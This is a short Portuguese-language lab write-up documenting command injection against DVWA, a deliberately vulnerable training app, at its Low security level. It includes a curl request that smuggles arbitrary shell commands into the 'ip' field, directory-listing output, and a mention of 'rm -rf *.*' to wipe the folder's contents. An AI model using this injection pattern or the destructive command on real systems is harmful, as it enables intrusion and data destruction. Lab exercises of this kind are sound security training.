# Documentação de Experimentos: Exploração de Command Injection

Esta documentação detalha os passos para reproduzir a exploração de uma vulnerabilidade de Command Injection no DVWA

## Pré-requisitos
1.  **Ambiente**: DVWA rodando e acessível.
2.  **Autenticação**: É necessário estar logado na aplicação. O cookie de sessão (`PHPSESSID`) deve ser obtido via ferramentas de desenvolvedor do navegador (F12 > Application > Cookies) após o login.
3.  **Configuração de Segurança**: DVWA configurado com nível de segurança `Low`.

## Passo a Passo da Exploração
### 1. Detecção da Vulnerabilidade
Identificar qual pasta do endereço está vulnerável para aceitar comandos de terminal (comandos que aceitam endereço IP)

### 2. Rodar comando de interação com o IP do alvo

**Comando**
```bash
curl -X POST "http://URL_DO_SITE/vulnerabilities/exec"  -H "Cookie: PHPSESSID=SEU_COOKIE; security=low" --data "ip=QUALQUER_IP;[ COMANDOS DE TERMINAL ]; Submit=Submit" 
```

**Resultados da Análise:**
O comando retorna o conteúdo completo em HTML nessa pasta do site, com uma das divs com o conteúdo gerado pelos comandos de terminal

O ataque não libera permissões para qualquer coisa (exemplo: remover os arquivos originais da pasta), mas ele permite que você elimine o conteúdo da pasta que aparece no navegadord se usar o comando rm -rf *.*

Resultado usando ls -la;cat help como [ COMANDOS DE TERMINAL ]:
drwxr-xr-x 1 www-data www-data 4096 Feb 14 17:19 .
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 ..
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 help
drwxr-xr-x 1 www-data www-data 4096 Oct 12  2018 source
